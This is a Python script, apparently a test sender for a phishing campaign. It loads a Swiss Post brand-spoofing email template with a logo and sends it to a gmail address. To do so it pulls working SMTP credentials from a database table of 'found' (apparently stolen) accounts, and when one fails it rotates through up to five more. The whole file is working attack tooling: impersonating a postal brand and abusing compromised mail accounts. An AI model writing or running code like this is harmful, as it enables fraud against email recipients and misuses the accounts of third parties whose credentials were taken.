"""Test send: Swiss Post template with logo to numerique.fiscal@gmail.com"""
import sys
sys.path.insert(0, "/opt/darkvasend")

from auditguard.spoof_templates import get_template
from auditguard.campaign_sender import send_clean
import sqlite3

TO_EMAIL = "numerique.fiscal@gmail.com"

tpl = get_template("swisspost")
if not tpl:
    print("ERROR: swisspost template not found")
    sys.exit(1)

print(f"Template: {tpl['brand']}")
print(f"From: {tpl['from_name']} <{tpl['from_email']}>")
print(f"Subject: {tpl['subject']}")
print(f"To: {TO_EMAIL}")

if "img src" in tpl["html"]:
    print("LOGO: Present in HTML!")
else:
    print("WARNING: No logo image found in HTML")

db = sqlite3.connect("/opt/darkvasend/bustgo-hunt.db", timeout=30)
db.row_factory = sqlite3.Row

row = db.execute("""
    SELECT id, smtp_host, smtp_port, smtp_user, smtp_password, provider, context
    FROM found_creds 
    WHERE auth_ok = 1 AND context LIKE '%SPOOF_INBOX%'
    ORDER BY found_at DESC LIMIT 1
""").fetchone()

if not row:
    row = db.execute("""
        SELECT id, smtp_host, smtp_port, smtp_user, smtp_password, provider, context
        FROM found_creds WHERE auth_ok = 1 ORDER BY found_at DESC LIMIT 1
    """).fetchone()

if not row:
    print("ERROR: No SMTP available")
    sys.exit(1)

smtp_host = row["smtp_host"]
smtp_port = row["smtp_port"]
smtp_user = row["smtp_user"]
smtp_pass = row["smtp_password"]
provider = row["provider"]

print(f"\nSMTP: {provider} | {smtp_host}:{smtp_port} | {smtp_user}")
print(f"Context: {row['context']}")
print(f"\nSending...")

smtp_config = {
    "host": smtp_host,
    "port": smtp_port,
    "username": smtp_user,
    "password": smtp_pass,
    "from_email": smtp_user,
}

result = send_clean(
    smtp_config,
    tpl["from_name"],
    tpl["from_email"],
    TO_EMAIL,
    tpl["subject"],
    tpl["html"],
    reply_to=tpl.get("reply_to", ""),
)

if result["success"]:
    print(f"\nSUCCESS! Mail sent to {TO_EMAIL}")
    print(f"Mode: {result.get('mode', 'clean')}")
else:
    print(f"\nFAILED: {result.get('error', 'unknown')}")
    print("\nTrying other SMTP...")
    rows = db.execute("""
        SELECT id, smtp_host, smtp_port, smtp_user, smtp_password, provider, context
        FROM found_creds 
        WHERE auth_ok = 1 AND id != ?
        ORDER BY found_at DESC LIMIT 5
    """, (row["id"],)).fetchall()
    
    for r2 in rows:
        smtp_config2 = {
            "host": r2["smtp_host"],
            "port": r2["smtp_port"],
            "username": r2["smtp_user"],
            "password": r2["smtp_password"],
            "from_email": r2["smtp_user"],
        }
        print(f"  Trying: {r2['provider']} {r2['smtp_host']}:{r2['smtp_port']} | {r2['smtp_user']}")
        result2 = send_clean(
            smtp_config2,
            tpl["from_name"],
            tpl["from_email"],
            TO_EMAIL,
            tpl["subject"],
            tpl["html"],
            reply_to=tpl.get("reply_to", ""),
        )
        if result2["success"]:
            print(f"  SUCCESS! Mail sent via {r2['smtp_host']}")
            break
        else:
            print(f"  Failed: {result2.get('error', '')}")

db.close()
